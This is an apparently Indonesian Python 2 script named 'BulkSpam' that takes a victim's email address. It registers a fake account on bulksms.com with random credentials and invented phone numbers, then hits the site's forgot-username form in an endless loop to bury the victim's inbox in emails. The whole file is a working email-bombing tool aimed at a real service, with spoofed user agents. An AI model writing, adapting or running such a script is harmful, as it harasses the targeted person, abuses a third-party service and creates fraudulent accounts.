import requests, threading, sys, os, random
os.system("clear")
os.system('figlet "BulkSpam" |lolcat')
print 55*"\033[33;5m="
em = raw_input("\033[35;5mEmail Target: \033[32;5m")
wikwik =  ["81243526382", "812346257388", "827362625362", "81243264625", "821364628482", "81249526782", "812346157388", "824362625362", "81243224625", "821364828482", "81243616178"]
hea = ["Mozilla/5.0 (Android 7.1.2; Mobile; rv:64.0) Gecko/64.0 Firefox/64.0", "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36", "Mozilla/5.0 (Linux; U; Android 7.1.2; id-id; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.7.3", "Opera/9.80 (Android; Opera Mini/36.2.2254/127.81; U; id) Presto/2.12.423 Version/12.16"]
heade = random.choice(hea)
header = {'user-agent': (heade)}
def kedua(email):
  global f
  f = 2
  while True:
    f +=1
    url2 = "https://www2.bulksms.com/forgot_password/recover_usernames/"
    keyw = {
    	'emailAddress': (email)
    	}
    metod = requests.request("post", url2, data=keyw)
    if "{}" in metod.text:
        print ("\033[31;5m[\033[33;5m" + str(f) + "\033[31;5m]\033[32;5mBerhasil Megirim \033[35;5m>> \033[37;5m" + (em))
    elif "error" in metod.text:
        print ("\033[31;5m[\033[33;5m" + str(f) + "\033[31;5m]\033[31;5mGagal Mengirim \033[35;5m>> \033[37;5m" + (em))
        print metod.text
        print ("\033[37;5mMohon Maaf! Terjadi Beberapa Kendala...")
        print ("[x]Keluar")
        sys.exit()
def Tod():
        c = 0
        non = random.choice(wikwik)
        uname = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(16))
        surname = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(6))
        gname = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(6))
        fpass = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz12345678910') for _ in range(16))
        key = {
          'validate': 'true',
          'username': (uname),
          'password': (fpass),
          'confirm_password': (fpass),
          'givenname': (gname),
          'surname': (surname),
          'email': (em),
          'msisdn_prefix': '62',
          'msisdn': (non),
          'billing_country': 'ID',
          'is_non_profit': '1',
          'terms_and_conditions': '1',
          'submit': 'Register',
          'viewed_page_0': '1',
          'current_page': '0',
          'screen_id': '1545198865',
          'vsmsid': '3'
        }
        url = ('https://www2.bulksms.com/register/')
        data = requests.request("post", url, headers=header, data=key)

        c +=1
        if 'You have been successfully registered' in data.text:
            print ("\033[31;5m[\033[33;5m" + str(c) + "\033[31;5m]\033[32;5mBerhasil Registrasi: \033[37;5m" + (em))
            print ("\033[31;5m[\033[33;5m!\033[31;5m]\033[33;5mMencoba Melakukan Lupa Password......")
            kedua(em)
        else:
            print ("\033[31;5m[\033[33;5m" + str(c) + "\033[31;5m]\033[31;5mGagal Registrasi \033[37;5m" + (em))
            print ("\033[31;5m[\033[33;5mF\033[31;5m]\033[33;5mMaaf, Tunggu Beberapa Jam/Menit lagi!")
            sys.exit()
if __name__ == '__main__':
    Tod()
